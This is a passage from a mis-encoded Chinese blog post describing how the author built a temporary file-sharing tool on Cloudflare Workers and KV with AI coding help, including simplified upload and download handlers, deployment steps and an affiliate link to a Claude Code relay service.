<h3 data-id="heading-9">æ•°æ®æµè½¬è¿‡ç¨‹</h3>
<p>æ•´ä¸ªæ•°æ®æµæ˜¯è¿™æ ·çš„ï¼š</p>
<pre><code class="hljs">å‘é€æ–¹ä¸Šä¼ 
  â†’ æ–‡ä»¶è½¬ Base64 ç¼–ç 
  â†’ å­˜å…¥ KVï¼ˆTTL: 1å°æ—¶ï¼‰
  â†’ è¿”å›åˆ†äº«ç 

æ¥æ”¶æ–¹ä¸‹è½½
  â†’ éªŒè¯åˆ†äº«ç 
  â†’ ä» KV è¯»å–æ•°æ®
  â†’ æ›´æ–° TTL ä¸º 1 åˆ†é’Ÿ
  â†’ è¿”å›æ–‡ä»¶/æ–‡æœ¬
</code></pre>
<p>æ ¸å¿ƒä»£ç å…¶å®å¾ˆç®€å•ï¼Œä»¥ä¸Šä¼ ä¸ºä¾‹ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// functions/api/upload.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">onRequestPost</span>(<span class="hljs-params">{ request, env }</span>) {
  <span class="hljs-keyword">const</span> formData = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">formData</span>();
  <span class="hljs-keyword">const</span> code = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">"code"</span>); <span class="hljs-comment">// 6ä½åˆ†äº«ç </span>
  <span class="hljs-keyword">const</span> content = formData.<span class="hljs-title function_">get</span>(<span class="hljs-string">"content"</span>); <span class="hljs-comment">// Base64 å†…å®¹</span>

  <span class="hljs-comment">// å­˜å…¥ KVï¼Œè®¾ç½® 1 å°æ—¶è¿‡æœŸ</span>
  <span class="hljs-keyword">await</span> env.<span class="hljs-property">TRANSFERS</span>.<span class="hljs-title function_">put</span>(
    code,
    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
      <span class="hljs-attr">type</span>: <span class="hljs-string">"file"</span>,
      <span class="hljs-attr">content</span>: content,
      <span class="hljs-attr">fileName</span>: fileName,
      <span class="hljs-attr">downloaded</span>: <span class="hljs-literal">false</span>,
    }),
    {
      <span class="hljs-attr">expirationTtl</span>: <span class="hljs-number">3600</span>, <span class="hljs-comment">// 1å°æ—¶ = 3600ç§’</span>
    }
  );

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({ <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> }));
}
</code></pre>
<p>ä¸‹è½½æ—¶ï¼š</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// functions/api/download.ts</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">onRequestGet</span>(<span class="hljs-params">{ request, env }</span>) {
  <span class="hljs-keyword">const</span> code = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(request.<span class="hljs-property">url</span>).<span class="hljs-property">searchParams</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">"code"</span>);

  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> env.<span class="hljs-property">TRANSFERS</span>.<span class="hljs-title function_">get</span>(code);

  <span class="hljs-comment">// æ ‡è®°ä¸ºå·²ä¸‹è½½ï¼Œæ›´æ–° TTL ä¸º 1 åˆ†é’Ÿ</span>
  <span class="hljs-keyword">await</span> env.<span class="hljs-property">TRANSFERS</span>.<span class="hljs-title function_">put</span>(
    code,
    <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>({
      ...data,
      <span class="hljs-attr">downloaded</span>: <span class="hljs-literal">true</span>,
    }),
    {
      <span class="hljs-attr">expirationTtl</span>: <span class="hljs-number">60</span>, <span class="hljs-comment">// 1åˆ†é’Ÿåè‡ªåŠ¨åˆ é™¤</span>
    }
  );

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Response</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(data));
}
</code></pre>
<p>æ˜¯ä¸æ˜¯å¾ˆç®€æ´ï¼ŸKV çš„ API éå¸¸æ˜“ç”¨ï¼Œè€Œä¸”æ”¯æŒç›´æ¥è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œçœå»äº†å¾ˆå¤šé¢å¤–çš„æ¸…ç†é€»è¾‘ã€‚</p>
<h3 data-id="heading-10">å‰ç«¯è®¾è®¡</h3>
<p>å‰ç«¯æˆ‘ç”¨äº† Tailwind CSS + åŸç”Ÿ JavaScriptï¼Œæ²¡æœ‰å¼•å…¥ Vue/React è¿™äº›æ¡†æ¶ï¼ŒåŸå› æ˜¯ï¼š</p>
<ol>
<li><strong>ä½“ç§¯å°</strong>ï¼šæ•´ä¸ªå‰ç«¯æ‰“åŒ…åä¸åˆ° 100KB</li>
<li><strong>åŠ è½½å¿«</strong>ï¼šé™æ€ HTMLï¼Œç§’å¼€</li>
<li><strong>å¤Ÿç”¨äº†</strong>ï¼šåŠŸèƒ½ä¸å¤æ‚ï¼Œç”¨ä¸ç€æ¡†æ¶</li>
</ol>
<p>ç•Œé¢è®¾è®¡ä¸Šè¿½æ±‚<strong>æç®€</strong>ï¼š</p>
<ul>
<li>ä¸¤ä¸ª Tabï¼ˆå‘é€/æ¥æ”¶ï¼‰</li>
<li>ä¸‰ç§å†…å®¹ç±»å‹ï¼ˆæ–‡ä»¶/æ–‡æœ¬/å›¾ç‰‡ï¼‰</li>
<li>ä¸€é”®æ“ä½œï¼ˆç”Ÿæˆç  â†’ ä¸Šä¼  â†’ åˆ†äº«ï¼‰</li>
</ul>
<p>æ”¯æŒæ‹–æ‹½ä¸Šä¼ ã€ç²˜è´´æˆªå›¾ï¼ˆCtrl/Cmd + Vï¼‰ï¼Œè¿™äº›äº¤äº’ç»†èŠ‚è®©ä½¿ç”¨ä½“éªŒæ›´å¥½ã€‚</p>
<h2 data-id="heading-11">å®‰å…¨æ€§è€ƒè™‘</h2>
<p>å…³äºå®‰å…¨ï¼Œæœ‰å‡ ç‚¹è¦è¯´æ˜ï¼š</p>
<h3 data-id="heading-12">åˆ†äº«ç çš„å¼ºåº¦</h3>
<p>6 ä½å­—ç¬¦ï¼ˆA-Z, 0-9ï¼‰= 36^6 = <strong>21.8 äº¿ç§ç»„åˆ</strong></p>
<p>ç†è®ºä¸Šæš´åŠ›ç ´è§£çš„æˆåŠŸç‡æ˜¯å¾ˆä½çš„ï¼Œè€Œä¸”ï¼š</p>
<ul>
<li>æ•°æ®ä¼šè‡ªåŠ¨è¿‡æœŸï¼ˆæœ€å¤š 1 å°æ—¶ï¼‰</li>
<li>åˆ†äº«ç åªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼ˆä¸‹è½½å 1 åˆ†é’Ÿåˆ é™¤ï¼‰</li>
</ul>
<p>æ‰€ä»¥å®‰å…¨æ€§å¯¹äº<strong>ä¸´æ—¶æ–‡ä»¶ä¼ è¾“</strong>åœºæ™¯æ˜¯å¤Ÿç”¨çš„ã€‚</p>
<h3 data-id="heading-13">ä½¿ç”¨å»ºè®®</h3>
<p>è™½ç„¶æœ‰ä¸€å®šå®‰å…¨æ€§ï¼Œä½†æˆ‘è¿˜æ˜¯å»ºè®®ï¼š</p>
<p>âš ï¸ <strong>ä¸è¦ä¼ è¾“é«˜åº¦æ•æ„Ÿä¿¡æ¯</strong>ï¼ˆå¯†ç ã€ç§é’¥ã€èº«ä»½è¯å·ç­‰ï¼‰</p>
<p>è¿™ä¸ªå·¥å…·çš„å®šä½æ˜¯<strong>è½»é‡çº§ä¸´æ—¶æ–‡ä»¶ä¼ è¾“</strong>ï¼Œé€‚åˆï¼š</p>
<ul>
<li>å‘é€å·¥ä½œæ–‡æ¡£</li>
<li>åˆ†äº«ç…§ç‰‡/æˆªå›¾</li>
<li>ä¼ è¾“ä»£ç æ–‡ä»¶</li>
<li>åˆ†äº«æ–‡æœ¬ç‰‡æ®µ</li>
</ul>
<h2 data-id="heading-14">éƒ¨ç½²è¶…ç®€å•</h2>
<p>è¯´åˆ°éƒ¨ç½²ï¼ŒçœŸçš„æ˜¯ç®€å•åˆ°çˆ†ã€‚å®Œå…¨ä¸éœ€è¦è‡ªå·±çš„æœåŠ¡å™¨ï¼Œåªéœ€è¦ä¸€ä¸ª Cloudflare è´¦å·ï¼ˆå…è´¹ï¼‰ï¼š</p>
<h3 data-id="heading-15">Fork + ä¸€é”®éƒ¨ç½²</h3>
<ol>
<li>
<p><strong>Fork æˆ‘çš„ GitHub ä»“åº“</strong></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fisnl%2Ff2f" target="_blank" title="https://github.com/isnl/f2f" ref="nofollow noopener noreferrer">github.com/isnl/f2f</a></p>
</li>
<li>
<p><strong>è¿æ¥åˆ° Cloudflare Pages</strong></p>
<ul>
<li>ç™»å½• Cloudflare Dashboard</li>
<li>Workers &amp; Pages â†’ åˆ›å»ºåº”ç”¨ â†’ è¿æ¥ Git</li>
<li>é€‰æ‹©ä½  Fork çš„ä»“åº“</li>
<li>æ„å»ºé…ç½®ï¼šè¾“å‡ºç›®å½•å¡« <code>public</code></li>
</ul>
</li>
<li>
<p><strong>åˆ›å»º KV å­˜å‚¨</strong></p>
<ul>
<li>åœ¨ KV æ¿å—åˆ›å»ºä¸€ä¸ªå‘½åç©ºé—´ï¼ˆæ¯”å¦‚ <code>f2f-transfers</code>ï¼‰</li>
<li>åœ¨ Pages é¡¹ç›®è®¾ç½®ä¸­ç»‘å®šè¿™ä¸ª KVï¼ˆå˜é‡åï¼š<code>TRANSFERS</code>ï¼‰</li>
</ul>
</li>
<li>
<p><strong>å®Œæˆï¼</strong></p>
<p>Cloudflare ä¼šç»™ä½ ä¸€ä¸ªåŸŸåï¼Œç›´æ¥è®¿é—®å°±èƒ½ç”¨ã€‚å¦‚æœæœ‰è‡ªå·±çš„åŸŸåï¼Œè¿˜å¯ä»¥ç»‘å®šè‡ªå®šä¹‰åŸŸåã€‚</p>
</li>
</ol>
<p>æ•´ä¸ªè¿‡ç¨‹ <strong>5 åˆ†é’Ÿæå®š</strong>ï¼Œè€Œä¸”ä¹‹åä¸éœ€è¦ä»»ä½•ç»´æŠ¤ï¼ŒCloudflare è‡ªåŠ¨å¸®ä½ å¤„ç†å…¨çƒåˆ†å‘ã€HTTPS è¯ä¹¦ã€æ•°æ®æ¸…ç†ç­‰ç­‰ã€‚</p>
<h2 data-id="heading-16">ä¸€äº›æœ‰è¶£çš„ä¼˜åŒ–</h2>
<h3 data-id="heading-17">1. 6 ä½åˆ†äº«ç çš„è®¾è®¡</h3>
<p>ä¸ºä»€ä¹ˆæ˜¯ 6 ä½ï¼Ÿå› ä¸ºï¼š</p>
<ul>
<li>4 ä½å¤ªçŸ­ï¼ˆåªæœ‰ 160 ä¸‡ç»„åˆï¼Œå®¹æ˜“ç¢°æ’ï¼‰</li>
<li>8 ä½å¤ªé•¿ï¼ˆç”¨æˆ·è®°å¿†å’Œè¾“å…¥æˆæœ¬é«˜ï¼‰</li>
<li>6 ä½åˆšåˆšå¥½ï¼ˆ21 äº¿ç»„åˆ + ä¾¿äºè®°å¿†ï¼‰</li>
</ul>
<p>è€Œä¸”åªç”¨å¤§å†™å­—æ¯å’Œæ•°å­—ï¼ˆä¸ç”¨å°å†™ï¼‰ï¼Œé¿å…äº† O å’Œ 0ã€I å’Œ 1 çš„æ··æ·†ã€‚</p>
<h3 data-id="heading-18">2. å›¾ç‰‡çš„ç‰¹æ®Šå¤„ç†</h3>
<p>å¯¹äºå›¾ç‰‡ç±»å‹ï¼Œæ¥æ”¶æ–¹å¯ä»¥ç›´æ¥åœ¨é¡µé¢ä¸Šé¢„è§ˆï¼Œè€Œä¸æ˜¯å¼ºåˆ¶ä¸‹è½½ã€‚è¿™æ ·åˆ†äº«æˆªå›¾ç‰¹åˆ«æ–¹ä¾¿ï¼Œå¯¹æ–¹æ‰“å¼€é“¾æ¥å°±èƒ½çœ‹åˆ°ã€‚</p>
<h3 data-id="heading-19">3. å“åº”å¼è®¾è®¡</h3>
<p>å…¨é¢é€‚é…æ‰‹æœºã€å¹³æ¿ã€ç”µè„‘ï¼Œåœ¨æ‰‹æœºä¸Šçš„ä½“éªŒä¹Ÿå¾ˆæµç•…ã€‚ç»å¸¸æˆ‘åœ¨å¤–é¢ç”¨æ‰‹æœºä¼ ä¸ªæ–‡ä»¶ç»™è‡ªå·±ç”µè„‘ï¼Œç‰¹åˆ«æ–¹ä¾¿ã€‚</p>
<h3 data-id="heading-20">4. å›½é™…åŒ–æ”¯æŒ</h3>
<p>å·²ç»å†…ç½®äº†ä¸­è‹±åŒè¯­æ”¯æŒï¼ˆi18nï¼‰ï¼Œæ ¹æ®æµè§ˆå™¨è¯­è¨€è‡ªåŠ¨åˆ‡æ¢ï¼Œä»£ç é‡Œä¹Ÿå‡†å¤‡äº†ä¸­è‹±æ–‡æ–‡æ¡£ã€‚è™½ç„¶åŠŸèƒ½ç®€å•ï¼Œä½†è¯¥æœ‰çš„ç»†èŠ‚éƒ½æœ‰ã€‚</p>
<h2 data-id="heading-21">AI ç¼–ç¨‹çš„ä¸€äº›æ„Ÿæ‚Ÿ</h2>
<h3 data-id="heading-22">1. AI æ˜¯æ”¾å¤§å™¨ï¼Œä¸æ˜¯æ›¿ä»£å“</h3>
<p>AI è®©æˆ‘çš„å¼€å‘æ•ˆç‡æå‡äº†è‡³å°‘ <strong>3-5 å€</strong>ï¼Œä½†æ ¸å¿ƒçš„ï¼š</p>
<ul>
<li>éœ€æ±‚è®¾è®¡ï¼ˆè¦åšä»€ä¹ˆï¼‰</li>
<li>æŠ€æœ¯é€‰å‹ï¼ˆç”¨ä»€ä¹ˆæ–¹æ¡ˆï¼‰</li>
<li>é—®é¢˜å‘ç°ï¼ˆå“ªé‡Œä¸å¯¹åŠ²ï¼‰</li>
<li>ä½“éªŒä¼˜åŒ–ï¼ˆæ€ä¹ˆåšæ›´å¥½ï¼‰</li>
</ul>
<p>è¿™äº›è¿˜æ˜¯éœ€è¦æˆ‘è‡ªå·±æ¥å†³ç­–ã€‚AI æ˜¯ä¸ªè¶…å¼ºçš„æ‰§è¡ŒåŠ©æ‰‹ï¼Œä½†äº§å“æ€ç»´å’ŒæŠ€æœ¯åˆ¤æ–­è¿˜å¾—é äººã€‚</p>
<h3 data-id="heading-23">2. ä¼šæé—®å¾ˆé‡è¦</h3>
<p>å’Œ AI å¯¹è¯å¼ç¼–ç¨‹ï¼Œæœ€é‡è¦çš„æ˜¯<strong>ä¼šæé—®</strong>ï¼š</p>
<ul>
<li>âŒ "å¸®æˆ‘å†™ä¸ªä¸Šä¼ åŠŸèƒ½"ï¼ˆå¤ªç¬¼ç»Ÿï¼‰</li>
<li>âœ… "å†™ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼  APIï¼Œæ¥æ”¶ FormDataï¼ŒéªŒè¯æ–‡ä»¶å¤§å°ä¸è¶…è¿‡ 25MBï¼Œè½¬ Base64 å­˜åˆ° KVï¼Œè®¾ç½® TTL ä¸º 3600 ç§’"ï¼ˆæ¸…æ™°æ˜ç¡®ï¼‰</li>
</ul>
<p>é—®é¢˜è¶Šå…·ä½“ï¼ŒAI ç»™çš„ç­”æ¡ˆè¶Šå‡†ç¡®ã€‚</p>
<h3 data-id="heading-24">3. å¿«é€Ÿè¿­ä»£æ‰æ˜¯ç‹é“</h3>
<p>æœ‰äº† AIï¼Œæˆ‘å¯ä»¥å¿«é€Ÿè¯•é”™ï¼š</p>
<ul>
<li>æƒ³åˆ°ä¸€ä¸ªåŠŸèƒ½ â†’ è®© AI å®ç° â†’ æµ‹è¯• â†’ ä¸æ»¡æ„å°±æ¢æ–¹æ¡ˆ</li>
<li>æ•´ä¸ªè¿‡ç¨‹å¯èƒ½åªè¦å‡ åˆ†é’Ÿ</li>
</ul>
<p>è¿™ç§å¿«é€Ÿè¿­ä»£çš„èƒ½åŠ›ï¼Œåœ¨ä»¥å‰æ˜¯ä¸æ•¢æƒ³è±¡çš„ã€‚</p>
<h3 data-id="heading-25">4. ä¸“æ³¨äºåˆ›æ„å’Œäº§å“</h3>
<p>å› ä¸º AI å¸®æˆ‘æå®šäº†å¤§é‡çš„"ä½“åŠ›æ´»"ï¼ˆå†™åŸºç¡€ä»£ç ã€è°ƒæ ·å¼ã€é…ç¯å¢ƒï¼‰ï¼Œæˆ‘å¯ä»¥æŠŠæ›´å¤šç²¾åŠ›æ”¾åœ¨ï¼š</p>
<ul>
<li>äº§å“ä½“éªŒçš„æ‰“ç£¨</li>
<li>åŠŸèƒ½ç»†èŠ‚çš„ä¼˜åŒ–</li>
<li>ç”¨æˆ·åœºæ™¯çš„æ€è€ƒ</li>
</ul>
<p>è¿™æ‰æ˜¯çœŸæ­£æœ‰ä»·å€¼çš„éƒ¨åˆ†ã€‚</p>
<h2 data-id="heading-26">æ€»ç»“</h2>
<h3 data-id="heading-27">å…³äº AI ç¼–ç¨‹å¼€å‘</h3>
<p><strong>AI çœŸçš„æ”¹å˜äº†ä¸ªäººå¼€å‘è€…çš„æ¸¸æˆè§„åˆ™</strong>ã€‚</p>
<p>ä»¥å‰åšä¸€ä¸ªå®Œæ•´çš„é¡¹ç›®ï¼Œå¯èƒ½éœ€è¦å‡ å¤©ç”šè‡³å‡ å‘¨ã€‚ç°åœ¨æœ‰äº† Cursor è¿™æ ·çš„ AI ç¼–ç¨‹å·¥å…·ï¼Œä¸€ä¸ªå‘¨æœ«ä¸‹åˆå°±èƒ½ä»æƒ³æ³•åˆ°ä¸Šçº¿ã€‚</p>
<p>ä½†å…³é”®æ˜¯ï¼Œä½ å¾—çŸ¥é“è‡ªå·±è¦ä»€ä¹ˆï¼Œç„¶åå¼•å¯¼ AI å»å®ç°ã€‚AI æ˜¯å·¥å…·ï¼Œæ˜¯åŠ©æ‰‹ï¼Œä¸æ˜¯é­”æ³•æ£’ã€‚</p>
<h3 data-id="heading-28">å…³äº Cloudflare</h3>
<p><strong>èµ›åšå¤§å–„äººï¼Œåä¸è™šä¼ </strong>ã€‚</p>
<p>ä½œä¸ºç©·é¬¼å¼€å‘è€…ï¼ŒCloudflare çš„å…è´¹æœåŠ¡è®©æˆ‘ä»¬ä¸éœ€è¦è´­ä¹°æœåŠ¡å™¨ã€ä¸éœ€è¦å…³å¿ƒè¿ç»´ã€ä¸éœ€è¦æ‹…å¿ƒæµé‡è´¹ç”¨ï¼Œå°±èƒ½åšå‡ºä¸€ä¸ª<strong>å…¨çƒå¯ç”¨ã€æ€§èƒ½ä¼˜ç§€</strong>çš„ Web åº”ç”¨ã€‚</p>
<p>è€Œä¸”å› ä¸ºæ˜¯è¾¹ç¼˜è®¡ç®—ï¼Œç”¨æˆ·è®¿é—®æ—¶ä¼šè‡ªåŠ¨è·¯ç”±åˆ°ç¦»ä»–æœ€è¿‘çš„èŠ‚ç‚¹ï¼Œæ— è®ºåœ¨å›½å†…è¿˜æ˜¯å›½å¤–ï¼Œé€Ÿåº¦éƒ½å¾ˆå¿«ã€‚</p>
<h3 data-id="heading-29">ç»™æƒ³å°è¯•çš„ä½ </h3>
<p>å¦‚æœä½ ä¹Ÿæƒ³ä½“éªŒ AI ç¼–ç¨‹å¼€å‘ï¼Œæˆ–è€…å¯¹ Cloudflare çš„è¾¹ç¼˜è®¡ç®—æ„Ÿå…´è¶£ï¼š</p>
<ol>
<li><strong>è£…ä¸ª Cursor</strong>ï¼ˆæˆ–è€…å…¶ä»– AI ç¼–ç¨‹å·¥å…·ï¼‰</li>
<li><strong>æ³¨å†Œä¸ª Cloudflare è´¦å·</strong>ï¼ˆå…è´¹çš„ï¼‰</li>
<li><strong>æƒ³ä¸ªæœ‰æ„æ€çš„å°é¡¹ç›®</strong>ï¼ˆè§£å†³è‡ªå·±çš„å®é™…éœ€æ±‚ï¼‰</li>
<li><strong>å¼€å§‹å’Œ AI èŠå¤©å†™ä»£ç </strong></li>
</ol>
<p>ä½ ä¼šå‘ç°ï¼Œåšä¸€ä¸ªè‡ªå·±çš„äº§å“ï¼ŒçœŸçš„æ²¡é‚£ä¹ˆéš¾äº†ã€‚</p>
<p>è¿™ä¸ªé¡¹ç›®çš„ä»£ç å¾ˆç®€æ´ï¼Œæ€»å…±ä¹Ÿå°±å‡ ç™¾è¡Œï¼Œéå¸¸é€‚åˆå­¦ä¹ å’ŒäºŒæ¬¡å¼€å‘ã€‚å¦‚æœä½ æƒ³è‡ªå·±éƒ¨ç½²ä¸€å¥—ï¼Œæˆ–è€…æƒ³çœ‹çœ‹æ˜¯æ€ä¹ˆå®ç°çš„ï¼Œæ¬¢è¿å» GitHub çœ‹çœ‹ã€‚</p>
<hr/>
<p><strong>é¡¹ç›®åœ°å€</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fisnl%2Ff2f" target="_blank" title="https://github.com/isnl/f2f" ref="nofollow noopener noreferrer">github.com/isnl/f2f</a></p>
<p><strong>åœ¨çº¿ä½“éªŒ</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ff2f.icu" target="_blank" title="https://f2f.icu" ref="nofollow noopener noreferrer">f2f.icu</a></p>
<p>å¦‚æœè§‰å¾—æœ‰ç”¨ï¼Œæ¬¢è¿ Star â­ï¸ æ”¯æŒä¸€ä¸‹ï¼</p>
<p>æœ‰ä»»ä½•é—®é¢˜æˆ–å»ºè®®ï¼Œä¹Ÿæ¬¢è¿åœ¨ GitHub ä¸Šæ Issueï¼Œæˆ‘ä¼šåŠæ—¶å›å¤çš„~</p>
<hr/>
<p><strong>æŠ€æœ¯æ ˆæ€»ç»“</strong>ï¼š</p>
<ul>
<li>ğŸ¤– å¼€å‘å·¥å…·ï¼šCursorï¼ˆAI è¾…åŠ©ç¼–ç¨‹ï¼‰</li>
<li>ğŸ¨ å‰ç«¯ï¼šåŸç”Ÿ JavaScript + Tailwind CSS</li>
<li>âš¡ï¸ åç«¯ï¼šCloudflare Workersï¼ˆServerlessï¼‰</li>
<li>ğŸ’¾ å­˜å‚¨ï¼šCloudflare KVï¼ˆé”®å€¼å­˜å‚¨ï¼‰</li>
<li>ğŸŒ æ‰˜ç®¡ï¼šCloudflare Pagesï¼ˆå…¨çƒ CDNï¼‰</li>
<li>ğŸŒ å›½é™…åŒ–ï¼šå†…ç½®ä¸­è‹±åŒè¯­æ”¯æŒ</li>
<li>ğŸ’° æˆæœ¬ï¼š<strong>å®Œå…¨å…è´¹</strong> ğŸ‰</li>
<li>â±ï¸ å¼€å‘æ—¶é—´ï¼š<strong>ä¸åˆ° 4 å°æ—¶</strong></li>
</ul>
<p>å¸Œæœ›è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼å¦‚æœä½ ä¹Ÿç”¨ AI åšäº†æœ‰è¶£çš„é¡¹ç›®ï¼Œæ¬¢è¿åœ¨è¯„è®ºåŒºåˆ†äº«~</p>
<hr/>
<p>å“¦å¯¹äº†ï¼Œæœ€è¿‘ä» Cursor åˆå¹³æ»‘è¿ç§»åˆ° Claude Code äº†ï¼Œç»™å¤§å®¶åˆ†äº«ä¸€ä¸ªæ­£åœ¨ä½¿ç”¨çš„ Claude Code ä¸­è½¬ç«™ï¼Œéå…¬ç›Šç«™ï¼</p>
<p>å› ä¸ºä»–å®¶æœ‰ä»˜è´¹ç”¨æˆ·ï¼Œæ‰€ä»¥ç¨³å®šæ€§ç›¸å½“ä¸é”™ï¼Œä½“éªŒéå¸¸ä¸æ»‘ï¼è€Œä¸”æ¨¡å‹èƒ½åŠ›å°±æˆ‘é‡åº¦ AI ä½¿ç”¨ä½“éªŒè€Œè¨€ï¼Œæ— é™æ™ºï¼æ— é™æ™ºï¼æ— é™æ™ºï¼(ç”¨è¿‡ Cursor/AugmentCode/Trae/Windsurf/Github Copilot/å›½äº§ glmã€kimiã€minimax ç­‰ç­‰)</p>
<p>æ³¨å†Œå³å¯èµ é€ 30 åˆ€é¢åº¦ï¼Œæ­£å¸¸ä½¿ç”¨ claude-4.5-sonnetï¼Œå¯ä»¥ç”¨å¾ˆä¹…</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fapi.codemirror.codes%2Fregister%3Faff%3DseMc" target="_blank" title="https://api.codemirror.codes/register?aff=seMc" ref="nofollow noopener noreferrer">api.codemirror.codes/register?afâ€¦</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>